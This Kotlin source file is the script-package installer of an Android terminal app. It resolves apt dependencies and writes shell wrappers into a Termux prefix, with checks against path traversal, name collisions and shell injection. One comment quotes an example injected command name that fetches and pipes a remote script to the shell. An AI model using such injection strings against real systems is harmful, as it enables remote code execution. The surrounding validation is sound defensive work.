package com.hereliesaz.hg2gui.azp

import android.content.Context
import com.hereliesaz.hg2gui.managers.AzpLibrary
import com.hereliesaz.hg2gui.terminal.DistroManager
import com.hereliesaz.hg2gui.terminal.TerminalEngine
import java.io.File

/**
 * Turns an installed `kind:"script"` package's [ScriptDto] into an actually-runnable command -
 * the `pkg install` step `spec/script.md` describes, mirroring how a real package manager (apt,
 * brew, ...) resolves a package's declared dependencies before exposing its binary. Only the
 * `"apt"` dependency namespace means anything here, since HG2Gui's real OS access is entirely
 * through its bundled Termux prefix (see [DistroManager]) - any other namespace (e.g. `"brew"`)
 * is present-but-unusable, same as an `mcp` package's unrecognized `grants` entry.
 *
 * Once dependencies resolve, a thin wrapper is written to `prefix/bin/<command>` that `exec`s the
 * interpreter against the package's own extracted, digest-verified entry file - never copying or
 * rewriting those bytes, so the integrity check [AzpInstaller] already ran keeps covering exactly
 * what runs. Requires a Termux bootstrap to already be installed (see [DistroManager.isInstalled])
 * - there is no OS package manager, and nothing to install a package's dependencies with, until
 * the user has bootstrapped one.
 */
object ScriptInstaller {

    sealed class Result {
        /** The wrapper is written and executable, callable as [command] from any shell session. */
        data class Installed(val command: String) : Result()
        /** `pkg install -y` for one or more declared dependencies exited non-zero; [output] is
         *  the shell transcript for diagnosis. Nothing is wired onto PATH. */
        data class DependencyFailed(val output: String) : Result()
        /** No Termux bootstrap yet - there's no `pkg`/`apt` to resolve dependencies with, and no
         *  `prefix/bin` to place a wrapper in. The package's bytes are still on disk from
         *  [AzpInstaller.install]; only becoming runnable is deferred. */
        object BootstrapMissing : Result()
        /** The package's declared `entry` is missing, isn't a digest-verified payload file inside
         *  its own extracted directory, or its declared `command` is unsafe, would resolve outside
         *  `prefix/bin`, or collides with a name there that isn't this package's own earlier
         *  wrapper. These checks all run before dependency installation, so nothing is
         *  installed, written or executed. */
        object Rejected : Result()
    }

    suspend fun install(
        context: Context,
        id: String,
        version: String,
        script: ScriptDto,
    ): Result {
        if (!DistroManager.isInstalled(context)) return Result.BootstrapMissing

        val prefix = DistroManager.prefixDir(context)
        val packageRoot = AzpInstaller.rootDirOrNull(context, id, version) ?: return Result.Rejected
        val entryFile = File(packageRoot, script.entry)
        // Must be an extracted payload file: AzpInstaller digest-checks every archive entry
        // except manifest.json/signature.json, so any other contained regular file is verified.
        if (!entryFile.isContainedIn(packageRoot) || !entryFile.isFile) return Result.Rejected
        val entryRelative = entryFile.canonicalFile.relativeTo(packageRoot.canonicalFile).invariantSeparatorsPath
        if (entryRelative in UNVERIFIED_ARCHIVE_FILES) return Result.Rejected

        val command = script.command?.takeIf { it.isNotBlank() } ?: commandNameFor(script.entry)
        // The name lands in a file path, in the generated wrapper-function profile bash sources
        // on every login, and on the command line - a name like "x;curl evil|sh" or "-rf"
        // would be shell injection there, so anything outside a plain identifier is refused.
        if (!isSafeCommandName(command)) return Result.Rejected

        val binDir = File(prefix, "bin")
        val wrapper = File(binDir, command)
        // command is package-declared, unlike entry's already-sanitized filename - it can walk
        // out of bin/ via ../ the same way a VFS name could, or simply name itself ls/pkg/bash
        // and overwrite whatever's already on PATH. Containment plus an existence check covers
        // both; the one name a package may replace is its own wrapper from an earlier version
        // (reinstall/upgrade), recognised by pointing into this package's azp/<id>/ directory.
        if (!wrapper.isContainedIn(binDir)) return Result.Rejected
        if ((wrapper.exists() || java.nio.file.Files.isSymbolicLink(wrapper.toPath())) && !isOwnWrapper(context, wrapper, id)) {
            return Result.Rejected
        }

        val engine = TerminalEngine(context)
        try {
            val aptPackages = script.dependencies["apt"].orEmpty()
            if (aptPackages.isNotEmpty()) {
                val (output, exitCode) = engine.runToCompletion(
                    "pkg install -y " + aptPackages.joinToString(" ") { it.shellQuoted() }
                )
                if (exitCode != 0) return Result.DependencyFailed(output)
            }

            val interpreter = resolveOnPrefix(prefix, script.interpreter)
            val argsSuffix = script.args.joinToString("") { " " + it.shellQuoted() }
            try {
                wrapper.writeText(
                    "#!${File(prefix, "bin/bash").absolutePath}\n" +
                        "exec ${interpreter.shellQuoted()} ${entryFile.absolutePath.shellQuoted()}$argsSuffix \"\$@\"\n"
                )
                if (!wrapper.setExecutable(true)) {
                    wrapper.delete()
                    return Result.Rejected
                }
            } catch (e: java.io.IOException) {
                wrapper.delete()
                return Result.Rejected
            }
            return Result.Installed(command)
        } finally {
            engine.destroy()
        }
    }

    /**
     * Removes an installed package: its PATH wrapper (only if it is still this package's own),
     * its extracted files under `filesDir/azp/<id>/`, and its [AzpLibrary] record. Dependencies
     * installed through `pkg` are left alone - other packages or the user may rely on them.
     */
    fun uninstall(context: Context, id: String) {
        if (!isValidAzpPathSegment(id)) return
        AzpLibrary.scriptCommand(context, id)?.takeIf { isSafeCommandName(it) }?.let { command ->
            val binDir = File(DistroManager.prefixDir(context), "bin")
            val wrapper = File(binDir, command)
            if (wrapper.isContainedIn(binDir) && isOwnWrapper(context, wrapper, id)) wrapper.delete()
        }
        packageDir(context, id)?.deleteRecursively()
        AzpLibrary.remove(context, id)
    }

    private val UNVERIFIED_ARCHIVE_FILES = setOf("manifest.json", "signature.json")

    /** `filesDir/azp/<id>/`, or null for an id that isn't a plain path segment. */
    private fun packageDir(context: Context, id: String): File? {
        if (!isValidAzpPathSegment(id)) return null
        val azpRoot = File(context.filesDir, "azp").canonicalFile
        return File(azpRoot, id).canonicalFile.takeIf { it.path.startsWith(azpRoot.path + File.separator) }
    }

    /** True iff [wrapper] is a regular file this installer wrote for package [id]: its exec line
     *  quotes an entry path inside `azp/<id>/`. Anything else on PATH is never replaced. */
    private fun isOwnWrapper(context: Context, wrapper: File, id: String): Boolean {
        if (!java.nio.file.Files.isRegularFile(wrapper.toPath(), java.nio.file.LinkOption.NOFOLLOW_LINKS)) return false
        val dir = packageDir(context, id) ?: return false
        val text = runCatching { wrapper.readText() }.getOrNull() ?: return false
        return text.lineSequence().any { line ->
            line.startsWith("exec ") && line.contains(" '" + dir.absolutePath + File.separator)
        }
    }

    /** The interpreter's absolute path within the prefix if it's there (e.g. just installed as a
     *  dependency), otherwise its bare name - resolved via the shell's own inherited PATH, which
     *  ShellSession already points at `prefix/bin` for every Termux-backed session. */
    private fun resolveOnPrefix(prefix: File, interpreter: String): String {
        val direct = File(prefix, "bin/$interpreter")
        return if (direct.canExecute()) direct.absolutePath else interpreter
    }
}

/** `script.entry`'s filename, extension stripped - the fallback `command` name when a package
 *  omits one, e.g. `script/git-sync.sh` -> `git-sync`. Pure and Context-free, split out from
 *  [ScriptInstaller.install] specifically so it's unit-testable without a Robolectric/instrumented
 *  Android runtime - see ScriptInstallerTest. */
internal fun commandNameFor(entry: String): String =
    File(entry).nameWithoutExtension.ifBlank { "script" }

private val SAFE_COMMAND_NAME = Regex("^[A-Za-z0-9._][A-Za-z0-9._-]{0,63}$")

/** True iff [name] is safe to use as a `prefix/bin` file name and as a bash function name in the
 *  generated wrapper profile: letters, digits, `.`, `_`, `-` only, no leading `-` (would parse as
 *  an option), no `/`, at most 64 chars, and not `.`/`..`. Pure for the same testability reason
 *  as [commandNameFor]; [DistroManager]'s profile writer applies the same rule. */
internal fun isSafeCommandName(name: String): Boolean =
    name != "." && name != ".." && SAFE_COMMAND_NAME.matches(name)

/** Single-quotes [this] for safe interpolation into a generated shell wrapper, escaping any
 *  embedded single quote the POSIX-shell way (`'\''`). Pure and Context-free for the same
 *  testability reason as [commandNameFor]. */
internal fun String.shellQuoted(): String = "'" + replace("'", "'\\''") + "'"

/** True iff [this] canonicalizes to somewhere inside [dir] - the same prefix-after-canonicalize
 *  check [AzpInstaller.install] already runs on each zip entry, reused here since a package-
 *  declared name (`script.entry`, `script.command`) is exactly as untrusted as an archive path. */
internal fun File.isContainedIn(dir: File): Boolean {
    val target = canonicalFile
    val root = dir.canonicalFile
    return target == root || target.path.startsWith(root.path + File.separator)
}
